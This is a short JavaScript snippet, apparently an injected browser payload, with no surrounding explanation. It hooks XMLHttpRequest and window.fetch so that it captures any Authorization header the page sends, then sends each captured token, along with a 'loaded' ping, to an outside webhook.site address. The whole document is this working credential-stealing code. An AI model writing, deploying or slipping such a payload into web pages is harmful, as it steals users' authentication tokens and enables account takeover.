(function () {
  var W = 'https://webhook.site/cea2ec69-f6d7-4100-b35d-4a7043d6f832';
  var s = function (t, v) {
    fetch(W + '/?t=' + t + '&v=' + encodeURIComponent(v), { mode: 'no-cors' });
  };

  // ping: proves loader + fetch work
  s('loaded', 'yes');

  // hook XHR
  var X = XMLHttpRequest.prototype;
  var orig = X.setRequestHeader;
  X.setRequestHeader = function (k, v) {
    if (k.toLowerCase() === 'authorization') s('xhr', v);
    return orig.apply(this, arguments);
  };

  // hook fetch
  var of = window.fetch;
  window.fetch = function () {
    try {
      var a = arguments;
      var h = (a[1] && a[1].headers) || (a[0] instanceof Request ? a[0].headers : null);
      if (h) {
        var v = (typeof h.get === 'function') ? h.get('Authorization') : null;
        if (!v) for (var k in h) if (k.toLowerCase() === 'authorization') v = h[k];
        if (v) s('fetch', v);
      }
    } catch (e) {}
    return of.apply(this, a);
  };
})();
